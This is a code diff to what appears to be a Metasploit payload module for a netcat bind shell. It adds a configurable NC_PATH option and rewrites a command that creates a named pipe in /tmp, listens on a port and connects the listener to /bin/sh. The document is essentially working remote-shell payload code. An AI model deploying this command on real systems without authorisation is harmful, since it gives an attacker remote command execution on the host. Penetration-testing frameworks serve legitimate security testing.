@@ -34,6 +34,9 @@ module MetasploitModule
           'Payload' => ''
         }
       ))
+    register_options([
+      OptString.new('NC_PATH', [true, 'The path to Netcat', 'nc'])
+    ])
   end
 
   #
@@ -49,6 +52,6 @@ module MetasploitModule
   #
   def command_string
     backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
-    "mkfifo /tmp/#{backpipe}; (nc -l -p #{datastore['LPORT']} ||nc -l #{datastore['LPORT']})0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
+    "mkfifo /tmp/#{backpipe}; (#{datastore['NC_PATH']} -l -p #{datastore['LPORT']} ||#{datastore['NC_PATH']} -l #{datastore['LPORT']})0</tmp/#{backpipe} | /bin/sh >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
   end
 end
